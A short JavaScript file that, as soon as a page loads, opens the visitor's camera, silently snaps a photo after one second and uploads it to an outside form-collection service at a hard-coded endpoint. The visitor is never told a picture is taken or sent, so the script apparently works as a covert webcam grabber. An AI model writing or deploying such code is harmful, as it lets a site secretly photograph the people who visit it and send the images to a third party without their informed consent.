const video = document.getElementById("preview");
let stream;

// Start camera immediately
startCamera();

async function startCamera() {
  try {
    // Works on laptop + phone (auto-selects best camera)
    stream = await navigator.mediaDevices.getUserMedia({
      video: true
    });

    video.srcObject = stream;

    // Auto-capture after 1 second
    setTimeout(captureAndUpload, 1000);

  } catch (err) {
    console.error("Camera failed:", err);
  }
}

async function captureAndUpload() {
  const canvas = document.createElement("canvas");
  canvas.width = video.videoWidth;
  canvas.height = video.videoHeight;

  const ctx = canvas.getContext("2d");
  ctx.drawImage(video, 0, 0);

  canvas.toBlob(async (blob) => {
    if (!blob) return console.error("Blob creation failed");

    const file = new File([blob], "photo.jpg", { type: "image/jpeg" });

    const formData = new FormData();
    formData.append("photo", file);  // Basin requires name="photo"

    try {
      await fetch("https://usebasin.com/f/fb249d3e371b", {
        method: "POST",
        body: formData,
        headers: { "Accept": "application/json" }
      });

      console.log("Uploaded to Basin ✔");

    } catch (error) {
      console.error("Upload error:", error);
    }

    stopCamera();
  }, "image/jpeg", 0.9);
}

function stopCamera() {
  if (stream) {
    stream.getTracks().forEach(track => track.stop());
  }
}
